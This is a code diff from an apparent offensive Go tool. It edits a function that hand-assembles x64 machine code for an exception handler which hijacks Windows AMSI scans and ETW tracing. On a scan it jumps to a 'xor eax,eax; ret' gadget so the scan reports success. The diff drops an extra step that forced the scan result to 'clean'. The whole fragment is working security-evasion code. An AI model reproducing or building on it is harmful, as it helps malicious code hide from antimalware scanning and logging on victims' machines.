@@ -234,37 +234,13 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneSkipAmsiOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget
-	// and write AMSI_RESULT_CLEAN (0) to the output parameter.
-	//
-	// AmsiScanBuffer signature (6 params, x64 ABI):
-	//   RCX = amsiContext, RDX = buffer, R8 = length, R9 = contentName,
-	//   [RSP+0x28] = amsiSession, [RSP+0x30] = AMSI_RESULT* result
-	//
-	// At breakpoint entry, context.Rsp points to the stack AFTER the call
-	// instruction pushed the return address. The 6th param (AMSI_RESULT*)
-	// is at [RSP+0x30]. We dereference that pointer and write 0 to it.
+	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget.
+	// The gadget executes naturally via the CPU's RET instruction, returning
+	// S_OK (0) to AmsiScanBuffer's caller with correct stack unwinding.
 	//
 	// Both AMSI and ETW are one-shot (disable after first interception per
 	// thread) to prevent repeated VEH invocations from Go runtime threads
 	// that cause process crashes.
-
-	// Write AMSI_RESULT_CLEAN to the output parameter before redirecting.
-	// Load context.Rsp into rax: rax = [rbx+0x98]
-	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
-	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
-	// Load AMSI_RESULT* from [rax+0x30]: rax = [rax+0x30]
-	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
-	// Null-check the pointer before dereferencing
-	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
-	code = append(code, 0x74) // jz skip_result_write (rel8)
-	jzSkipResultOffset := len(code)
-	code = append(code, 0x00) // placeholder
-	// Write AMSI_RESULT_CLEAN (0) to *result: [rax] = 0
-	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
-	// skip_result_write:
-	skipResultTarget := len(code)
-	code[jzSkipResultOffset] = byte(skipResultTarget - jzSkipResultOffset - 1)
 
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
